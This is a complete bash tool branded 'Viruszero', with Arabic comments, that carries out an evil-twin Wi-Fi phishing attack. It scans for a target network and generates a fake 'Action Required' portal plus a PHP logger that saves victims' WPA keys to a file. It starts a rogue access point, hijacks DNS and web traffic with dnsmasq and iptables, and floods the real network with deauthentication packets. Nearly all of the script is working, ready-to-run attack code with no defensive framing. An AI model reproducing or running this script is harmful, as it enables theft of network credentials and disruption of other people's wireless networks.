#!/bin/bash

# جلب المسار الحالي واسم المستخدم تلقائياً
TOOL_PATH=$(pwd)
CURRENT_USER=$(whoami)

# الألوان (تنسيق Viruszero)
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${RED}"
    echo "██╗   ██╗██╗██████╗ ██╗   ██╗███████╗███████╗███████╗██████╗ "
    echo "██║   ██║██║██╔══██╗██║   ██║██╔════╝╚══███╔╝██╔════╝██╔══██╗"
    echo "██║   ██║██║██████╔╝██║   ██║███████╗  ███╔╝ █████╗  ██████╔╝"
    echo "╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║ ███╔╝  ██╔══╝  ██╔══██╗"
    echo " ╚████╔╝ ██║██║  ██║╚██████╔╝███████║███████╗███████╗██║  ██║"
    echo "  ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝"
    echo -e "${CYAN}          [ OWNER: VIRUSZERO | SYSTEM: KALI LINUX | PATH: $TOOL_PATH ] ${NC}"
}

reset_system() {
    echo -e "${YELLOW}[*] Deep cleaning and restoring system...${NC}"
    sudo killall dnsmasq airbase-ng aireplay-ng tshark apache2 2>/dev/null
    sudo rm /var/www/html/index.html /var/www/html/login.php 2>/dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo iptables -X
    sudo ifconfig at0 down 2>/dev/null
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
    sudo systemctl stop apache2 2>/dev/null
    sudo systemctl restart NetworkManager
    echo -e "${GREEN}[+] System Cleaned & Restored!${NC}"
}

start_attack() {
    show_banner
    sudo airmon-ng check kill > /dev/null 2>&1
    sudo airmon-ng start wlan0 > /dev/null 2>&1
    
    echo -e "${YELLOW}[!] Scanning for Targets... (CTRL+C to lock target)${NC}"
    sleep 2
    sudo airodump-ng wlan0mon

    read -p "Target SSID (e.g., gemnia): " ESSID
    read -p "Target BSSID: " BSSID
    read -p "Target Channel: " CH

    # --- 1. بناء صفحة الـ HTML الذكية (Smart Phishing) ---
    cat <<EOF > "$TOOL_PATH/index.html"
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$ESSID Security Portal</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 20px; }
        .container { background: #2d2d2d; padding: 40px; border-radius: 15px; border-top: 5px solid #d32f2f; display: inline-block; max-width: 400px; }
        h2 { color: #ff5252; margin-bottom: 10px; }
        .status { background: #444; padding: 10px; border-radius: 5px; font-size: 14px; margin-bottom: 20px; }
        input[type="password"] { width: 100%; padding: 12px; margin: 15px 0; border: none; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        button { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 18px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #b71c1c; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Action Required</h2>
        <div class="status">Network: <b>$ESSID</b><br>Protocol: <b>WPA/WPA2-PSK</b></div>
        <p>A critical security vulnerability was detected. Please verify your network key to continue.</p>
        <form action="login.php" method="POST">
            <input type="password" name="password" placeholder="WPA Key for $ESSID" required autofocus>
            <button type="submit">Verify & Connect</button>
        </form>
    </div>
</body>
</html>
EOF

    # --- 2. بناء الـ Backend الاحترافي مع حفظ المسار للمستخدم ---
    PASSWORD_FILE="$TOOL_PATH/viruszero_passwords.txt"
    touch "$PASSWORD_FILE" && chmod 777 "$PASSWORD_FILE"

    cat <<EOF > "$TOOL_PATH/login.php"
<?php
\$file = '$PASSWORD_FILE';
\$password = \$_POST['password'];
\$essid = '$ESSID';
\$date = date('Y-m-d H:i:s');
\$handle = fopen(\$file, 'a');
fwrite(\$handle, "Time: [\$date] | SSID: [\$essid] | Pass: [\$password]\n");
fclose(\$handle);
// تنبيه صوتي في التيرمينال عند وصول الباسورد
echo "<script>console.log('Password Captured');</script>";
header('Location: https://www.google.com');
exit();
?>
EOF

    # ربط الملفات
    sudo ln -sf "$TOOL_PATH/index.html" /var/www/html/index.html
    sudo ln -sf "$TOOL_PATH/login.php" /var/www/html/login.php

    # --- 3. إعداد الـ DNSMasq والهجوم ---
    cat <<EOF > dnsmasq.conf
interface=at0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
server=1.1.1.1
no-resolv
address=/#/192.168.1.1
address=/connectivitycheck.gstatic.com/192.168.1.1
address=/clients3.google.com/192.168.1.1
EOF

    # بدء التشغيل
    x-terminal-emulator -T "VIRUSZERO: ENGINE" -e "sudo airbase-ng -e '$ESSID' -c $CH wlan0mon" &
    sleep 6
    sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 up
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

    # --- 4. قواعد الـ IPTABLES "القوية" للهجوم ---
    sudo iptables -F
    sudo iptables -t nat -F
    # منع الهروب للـ DNS الخارجي
    sudo iptables -t nat -A PREROUTING -i at0 -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53
    # تحويل الـ HTTP/HTTPS
    sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
    sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
    # إجبار الموبايل على طلب الـ Portal
    sudo iptables -A FORWARD -i at0 -p tcp --dport 443 -j REJECT --reject-with tcp-reset
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE

    sudo systemctl start apache2
    x-terminal-emulator -T "VIRUSZERO: DNS LOGS" -e "sudo dnsmasq -C dnsmasq.conf -d -q" &
    x-terminal-emulator -T "VIRUSZERO: DEAUTH" -e "sudo aireplay-ng --deauth 0 -a $BSSID wlan0mon" &
    x-terminal-emulator -T "VIRUSZERO: LIVE PASSWORDS" -e "tail -f $PASSWORD_FILE" &

    echo -e "${GREEN}====================================================${NC}"
    echo -e "${GREEN}[+] ATTACK IS LIVE! Page personalized for: $ESSID${NC}"
    echo -e "${YELLOW}[!] PASSWORDS WILL BE SAVED TO:${NC}"
    echo -e "${CYAN}>> $PASSWORD_FILE <<${NC}"
    echo -e "${GREEN}====================================================${NC}"
}

# القائمة الرئيسية
while true; do
    show_banner
    echo -e "1) Start Attack"
    echo "2) Reset System"
    echo "3) Exit"
    echo -ne "${YELLOW}Choose Option: ${NC}"
    read choice
    case $choice in
        1) start_attack ;;
        2) reset_system ;;
        3) exit 0 ;;
        *) echo "Invalid choice" ;;
    esac
done
